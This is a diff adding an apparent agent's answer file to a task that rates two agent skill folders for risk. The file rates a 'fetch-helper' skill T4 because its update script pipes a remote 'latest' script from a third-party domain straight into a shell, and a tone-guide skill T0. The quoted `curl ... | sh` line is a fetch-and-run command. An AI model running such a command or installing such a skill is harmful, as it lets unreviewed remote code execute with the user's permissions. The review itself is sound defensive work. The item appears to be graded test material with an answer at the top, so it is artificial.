@@ -1,0 +1,59 @@
+diff --git a/ANSWER.md b/ANSWER.md
+new file mode 100644
+index 0000000..f87ffb6
+--- /dev/null
++++ b/ANSWER.md
+@@ -0,0 +1,53 @@
++skills/fetch-helper: T4
++skills/tone-guide: T0
++
++## Method
++
++I scanned both folders as data and did not execute anything in them. The skill-xray
++scanner isn't installed locally. The guide's step 1 says to `curl` it from GitHub, but
++I skipped that: these folders are only 3 files and 34 lines in total, so I read every
++line by hand and applied the guide's T0–T4 tiers. The tiers apply only to the exact
++content hashes listed below.
++
++## skills/fetch-helper — T4 (opaque: fetches and runs code at runtime)
++
++Files (sha256):
++- `SKILL.md` 9b07a1d9fa8895f5475b3a78c355c8803b4b21d10f3451a7a5201be3d15a5a57
++- `scripts/update.sh` 1bcfe4041f13ea50f6edd193a2852c1baf0ae634e653c13cfc11790cc313a119
++
++Evidence:
++- `skills/fetch-helper/scripts/update.sh:6` — `curl -fsSL "$HELPER_URL" | sh`: a
++  fetch-and-run one-liner. It downloads a remote script and pipes it straight into a
++  shell. Nothing pins, checksums or signs the download, so what actually runs is
++  decided by the remote server at run time, not by anything in this folder. This
++  alone makes it T4.
++- `skills/fetch-helper/scripts/update.sh:4` — endpoint
++  `https://helpers.example-tools.dev/bootstrap/latest.sh`. This is a mutable
++  `latest` URL on a third-party domain, so the code can change between runs.
++- `skills/fetch-helper/SKILL.md:10` — tells the agent to "Run `scripts/update.sh`
++  from the repository root", so the agent runs the line above with the user's
++  permissions.
++- `skills/fetch-helper/SKILL.md:3` — triggers on "update helpers" or "before a
++  release", so it can be invoked without the user specifically asking for it.
++- `skills/fetch-helper/SKILL.md:11` — runs `helper --version`, a binary that the
++  remote script installs. This is also unreviewed code.
++- No credential-file paths or agent-config (`CLAUDE.md`) writes appear in the local
++  files. That doesn't rule them out, because the remote payload can do anything.
++
++Recommendation: don't add it as is. Pin a version and verify a checksum, or vendor
++the bootstrap script so it can be reviewed.
++
++## skills/tone-guide — T0 (inert instructional text)
++
++Files (sha256):
++- `SKILL.md` 484e0f0950f24aede7b31f784f775e87093727696eeb1da0eda4d9ff51601fda
++
++Evidence:
++- It has a single file, `skills/tone-guide/SKILL.md` (lines 1–15), which is pure
++  writing-style guidance for release notes.
++- It has no scripts, commands, URLs/endpoints, file paths, credential references,
++  config writes, encoded blobs or tool invocations.
++- Lines 8–15 only shape the wording of text the agent writes (for example, "One idea
++  per bullet", "Never promise dates for future work").
++
++No findings.
